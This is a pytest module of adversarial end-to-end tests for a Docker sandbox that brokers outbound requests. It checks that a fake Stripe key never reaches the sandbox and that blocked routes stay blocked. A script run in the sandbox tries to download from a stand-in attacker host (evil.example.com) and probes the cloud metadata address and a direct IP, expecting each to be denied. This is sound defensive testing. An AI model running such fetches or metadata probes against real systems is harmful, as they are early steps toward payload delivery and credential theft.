"""Adversarial end-to-end tests for Docker virtual egress.

These prove *non-possession*: the sandbox never receives the real secret, cannot
reach the provider directly, and the credential dies with the session. They spin
real containers, so they are gated on a responsive Docker daemon.
"""

from __future__ import annotations

import asyncio
import http.server
import os
import shutil
import socket
import subprocess
import threading

import httpx
import pytest
from tests.egress_conformance import (
    EgressScenarioEvidence,
    egress_nightly_failure_boundary,
    emit_egress_nightly_evidence,
    registration_for,
)
from tests.egress_e2e_support import CapturingEgressAdapter, drive_adversarial_egress_contract

from cayu.egress import (
    ApprovedEgressDestination,
    CapturedRequest,
    CapturedResponse,
    HttpEgressPolicy,
)
from cayu.runners.base import ExecCommand
from cayu.vaults import SecretRef, StaticVault

pytest.importorskip("cryptography")

from cayu.egress.docker_adapter import DockerEgressAdapter

REAL_SECRET = "sk_test_51E2ERealSecretNeverInSandbox"
SANDBOX_IMAGE = "python:3.12-slim"


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        result = subprocess.run(
            ["docker", "info"],
            capture_output=True,
            timeout=15,
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return result.returncode == 0


_DOCKER_AVAILABLE = _docker_available()
if os.environ.get("CAYU_REQUIRE_DOCKER_EGRESS") == "1" and not _DOCKER_AVAILABLE:
    raise RuntimeError("CAYU_REQUIRE_DOCKER_EGRESS=1 but the Docker daemon is unavailable.")

pytestmark = pytest.mark.skipif(
    not _DOCKER_AVAILABLE,
    reason="Docker daemon not available for virtual-egress E2E.",
)


class _FakeStripe:
    """Stands in for api.stripe.com so the E2E needs no real Stripe key."""

    def __init__(self) -> None:
        self.upstream_authorization: str | None = None

    async def send(self, request: CapturedRequest) -> CapturedResponse:
        self.upstream_authorization = request.headers.get("Authorization")
        return CapturedResponse(
            status_code=200,
            headers={"Request-Id": "req_e2e"},
            body=b'{"id":"cus_fake123","object":"customer"}',
        )


def _stripe_example_policy() -> HttpEgressPolicy:
    return HttpEgressPolicy(
        name="stripe-example",
        allowed_hosts=["api.stripe.com"],
        allowed_endpoints=[("POST", "/v1/customers")],
    )


async def _drive() -> tuple[EgressScenarioEvidence, ...]:
    return await drive_adversarial_egress_contract(
        registration=registration_for("docker"),
        adapter=CapturingEgressAdapter(DockerEgressAdapter(loop=asyncio.get_running_loop())),
        real_secret=REAL_SECRET,
        image=SANDBOX_IMAGE,
        search_roots=("/workspace", "/tmp", "/etc/cayu", "/root"),
        response_id="cus_fake123",
    )


@pytest.fixture(scope="module")
def e2e_results() -> tuple[EgressScenarioEvidence, ...]:
    with egress_nightly_failure_boundary("docker"):
        return asyncio.run(_drive())


def test_shared_real_boundary_security_contract(
    e2e_results: tuple[EgressScenarioEvidence, ...],
) -> None:
    with egress_nightly_failure_boundary("docker"):
        assert {item.scenario for item in e2e_results} == {
            "brokered-provider-and-session-ca",
            "guest-network-bypass-denial",
            "guest-secret-non-possession",
        }
        assert all(item.adapter == "docker" for item in e2e_results)
        assert all(item.status == "verified" for item in e2e_results)
        assert REAL_SECRET not in repr(e2e_results)
        emit_egress_nightly_evidence(e2e_results)


# --- Full runtime wiring: the VirtualEgressEnvironmentFactory lifecycle. ---


async def _drive_factory() -> dict[str, object]:
    from cayu.core.events import Event, EventType
    from cayu.environments import EnvironmentFactoryRequest
    from cayu.runtime.egress import VirtualCredentialSpec, VirtualEgressEnvironmentFactory

    events: list[Event] = []
    authorized_seen = asyncio.Event()

    async def emitter(event: Event) -> Event:
        events.append(event)
        if event.type == EventType.EGRESS_REQUEST_AUTHORIZED:
            authorized_seen.set()
        return event

    upstream = _FakeStripe()
    factory = VirtualEgressEnvironmentFactory(
        resolver=StaticVault({"stripe_test_key": REAL_SECRET}),
        policies={"stripe-example": _stripe_example_policy()},
        credentials=[
            VirtualCredentialSpec(
                env_name="STRIPE_SECRET_KEY",
                secret=SecretRef(name="stripe_test_key"),
                destination="api.stripe.com",
                policy_name="stripe-example",
            )
        ],
        image=SANDBOX_IMAGE,
        event_emitter=emitter,
        upstream=upstream,
    )
    request = EnvironmentFactoryRequest(
        session_id="e2e-factory", agent_name="agent", environment_name="egress-env"
    )
    result = await factory.create(request)
    runner = result.environment.runner
    assert runner is not None

    call_script = (
        "import os, urllib.request as u\n"
        "req = u.Request('https://api.stripe.com/v1/customers', data=b'email=a@b.co',\n"
        "    headers={'Authorization': 'Bearer ' + os.environ['STRIPE_SECRET_KEY']})\n"
        "print(u.urlopen(req, timeout=25).read().decode())\n"
    )
    try:
        call = await runner.exec(ExecCommand.process("python3", "-c", call_script), timeout_s=60)
        await asyncio.wait_for(authorized_seen.wait(), timeout=2)
    finally:
        bound = await result.environment.binding.bind(None, runner, session_id="e2e-factory")
        await result.environment.binding.finalize(bound, outcome="completed")

    return {
        "call_stdout": call.stdout,
        "upstream_authorization": upstream.upstream_authorization,
        "event_types": [str(e.type) for e in events],
        "event_payloads": " ".join(str(e.payload) for e in events),
        "authorized": EventType.EGRESS_REQUEST_AUTHORIZED,
        "minted": EventType.EGRESS_GRANT_MINTED,
        "revoked": EventType.EGRESS_GRANT_REVOKED,
    }


@pytest.fixture(scope="module")
def factory_results() -> dict[str, object]:
    return asyncio.run(_drive_factory())


def test_factory_allowed_call_succeeds_with_swap(factory_results: dict[str, object]) -> None:
    assert "cus_fake123" in str(factory_results["call_stdout"])
    assert REAL_SECRET not in str(factory_results["call_stdout"])
    assert factory_results["upstream_authorization"] == f"Bearer {REAL_SECRET}"


def test_factory_emits_audit_events_without_secret(factory_results: dict[str, object]) -> None:
    types = factory_results["event_types"]
    assert str(factory_results["minted"]) in types
    assert str(factory_results["authorized"]) in types
    assert str(factory_results["revoked"]) in types
    assert REAL_SECRET not in str(factory_results["event_payloads"])


async def _drive_credentialless_factory() -> dict[str, object]:
    from cayu.core.events import Event, EventType
    from cayu.environments import EnvironmentFactoryRequest
    from cayu.runtime.egress import VirtualEgressEnvironmentFactory

    endpoint_requests: list[dict[str, str]] = []

    class _DocsHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            endpoint_requests.append(
                {
                    "path": self.path,
                    "authorization": self.headers.get("Authorization", ""),
                }
            )
            body = b'{"docs":"bounded"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, _format: str, *_args: object) -> None:
            return

    endpoint = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _DocsHandler)
    endpoint_thread = threading.Thread(target=endpoint.serve_forever, daemon=True)
    endpoint_thread.start()

    class _PublicDocs:
        def __init__(self) -> None:
            self.requests: list[CapturedRequest] = []

        async def send(self, request: CapturedRequest) -> CapturedResponse:
            self.requests.append(request)
            async with httpx.AsyncClient(timeout=5) as client:
                response = await client.request(
                    request.method,
                    f"http://127.0.0.1:{endpoint.server_port}{request.path}",
                    content=request.body,
                )
            return CapturedResponse(
                status_code=response.status_code,
                headers=dict(response.headers),
                body=response.content,
            )

    events: list[Event] = []

    async def emitter(event: Event) -> Event:
        events.append(event)
        return event

    upstream = _PublicDocs()
    factory = VirtualEgressEnvironmentFactory(
        policies={
            "public-docs": HttpEgressPolicy(
                name="public-docs",
                allowed_hosts=["docs.example.com"],
                allowed_endpoints=[("GET", "/sdk/index.json")],
            )
        },
        approved_destinations=[
            ApprovedEgressDestination(
                destination="docs.example.com",
                policy_name="public-docs",
            )
        ],
        credentials=[],
        image=SANDBOX_IMAGE,
        event_emitter=emitter,
        upstream=upstream,
    )
    try:
        result = await factory.create(
            EnvironmentFactoryRequest(
                session_id="e2e-credentialless",
                agent_name="agent",
                environment_name="egress-env",
            )
        )
        runner = result.environment.runner
        binding = result.environment.binding
        assert runner is not None
        assert binding is not None
        script = (
            "import socket, urllib.error, urllib.request as u\n"
            "print(u.urlopen('https://docs.example.com/sdk/index.json', timeout=25).read().decode())\n"
            "try:\n"
            "    u.urlopen('https://evil.example.com/payload', timeout=25)\n"
            "except urllib.error.HTTPError as exc:\n"
            "    print('denied', exc.code)\n"
            "def blocked(host, port):\n"
            "    try:\n"
            "        socket.create_connection((host, port), timeout=2).close()\n"
            "        return False\n"
            "    except OSError:\n"
            "        return True\n"
            "print('direct-ip-denied', blocked('1.1.1.1', 443))\n"
            "print('metadata-denied', blocked('169.254.169.254', 80))\n"
        )
        try:
            call = await runner.exec(ExecCommand.process("python3", "-c", script), timeout_s=60)
            egress_binding = runner._egress_binding
            assert egress_binding.sidecar is not None
            assert egress_binding.proxy_port is not None
            proxy_bind_host = str(egress_binding.metadata["proxy_bind_host"])

            def direct_broker_rejected() -> bool:
                connect_host = "127.0.0.1" if proxy_bind_host == "0.0.0.0" else proxy_bind_host
                try:
                    with socket.create_connection(
                        (connect_host, egress_binding.proxy_port), timeout=5
                    ) as connection:
                        connection.sendall(
                            b"CONNECT docs.example.com:443 HTTP/1.1\r\n"
                            b"Host: docs.example.com:443\r\n\r\n"
                        )
                        return not connection.recv(1024).startswith(b"HTTP/1.1 200")
                except OSError:
                    return True

            def default_bridge_peer_rejected() -> bool:
                inspection = subprocess.run(
                    [
                        "docker",
                        "inspect",
                        "--format",
                        '{{(index .NetworkSettings.Networks "bridge").IPAddress}}',
                        egress_binding.sidecar,
                    ],
                    check=True,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )
                sidecar_default_ip = inspection.stdout.strip()
                probe = subprocess.run(
                    [
                        "docker",
                        "run",
                        "--rm",
                        "--network",
                        "bridge",
                        SANDBOX_IMAGE,
                        "python3",
                        "-c",
                        (
                            "import socket,sys; "
                            "sock=socket.socket(); sock.settimeout(3); "
                            "\ntry: sock.connect((sys.argv[1],8080))\n"
                            "except OSError: raise SystemExit(0)\n"
                            "else: sock.close(); raise SystemExit(1)"
                        ),
                        sidecar_default_ip,
                    ],
                    capture_output=True,
                    timeout=30,
                )
                return probe.returncode == 0

            direct_broker_denied = await asyncio.to_thread(direct_broker_rejected)
            default_bridge_peer_denied = await asyncio.to_thread(default_bridge_peer_rejected)
        finally:
            bound = await binding.bind(None, runner, session_id="e2e-credentialless")
            await binding.finalize(bound, outcome="completed")
    finally:
        endpoint.shutdown()
        endpoint.server_close()
        endpoint_thread.join(timeout=5)
    return {
        "exit_code": call.exit_code,
        "timed_out": call.timed_out,
        "stdout": call.stdout,
        "stderr": call.stderr,
        "requests": upstream.requests,
        "endpoint_requests": endpoint_requests,
        "events": events,
        "direct_broker_denied": direct_broker_denied,
        "default_bridge_peer_denied": default_bridge_peer_denied,
        "authorized": EventType.EGRESS_REQUEST_AUTHORIZED,
        "denied": EventType.EGRESS_REQUEST_DENIED,
    }


@pytest.fixture(scope="module")
def credentialless_factory_results() -> dict[str, object]:
    return asyncio.run(_drive_credentialless_factory())


def test_credentialless_factory_crosses_real_docker_boundary_without_fake_secret(
    credentialless_factory_results: dict[str, object],
) -> None:
    assert credentialless_factory_results["exit_code"] == 0
    assert credentialless_factory_results["timed_out"] is False
    assert '{"docs":"bounded"}' in str(credentialless_factory_results["stdout"])
    assert "denied 403" in str(credentialless_factory_results["stdout"])
    assert "direct-ip-denied True" in str(credentialless_factory_results["stdout"])
    assert "metadata-denied True" in str(credentialless_factory_results["stdout"])
    assert credentialless_factory_results["direct_broker_denied"] is True
    assert credentialless_factory_results["default_bridge_peer_denied"] is True
    requests = credentialless_factory_results["requests"]
    assert isinstance(requests, list)
    assert len(requests) == 1
    assert "authorization" not in {
        key.lower()
        for key in requests[0].headers  # type: ignore[union-attr]
    }
    assert credentialless_factory_results["endpoint_requests"] == [
        {"path": "/sdk/index.json", "authorization": ""}
    ]
    events = credentialless_factory_results["events"]
    assert isinstance(events, list)
    request_events = [
        event
        for event in events
        if event.type
        in {
            credentialless_factory_results["authorized"],
            credentialless_factory_results["denied"],
        }
    ]
    assert request_events
    assert all(event.payload["authorization_kind"] == "credentialless" for event in request_events)
